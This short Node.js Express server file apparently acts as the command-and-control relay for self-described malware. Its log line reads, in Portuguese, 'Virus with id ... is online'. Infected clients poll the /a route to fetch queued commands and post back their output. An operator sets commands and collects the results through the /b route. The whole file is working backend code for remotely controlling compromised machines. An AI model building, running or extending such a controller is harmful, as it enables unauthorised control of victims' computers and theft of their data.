const express = require('express');
const app = express();
let a = 'nada'
let b
var port = process.env.PORT || 3000
app.use(express.json({limit: "50mb"}));
app.use(express.urlencoded({limit: "50mb", extended: true, parameterLimit:50000}));

app.post('/a', (req, res) => {
    console.log('Virus com id: ' + req.headers.id + '   Esta Online');
res.send(a)
a = 'nada'
b = req.body
console.log(req.body)
});

app.post('/b', (req, res) => {
a = req.body.text
if(b != undefined){
    res.send(b)
}
});

app.get('/', (req, res) => {

res.sendFile(require('path').join(__dirname, 'index.html'));

});

app.listen(port);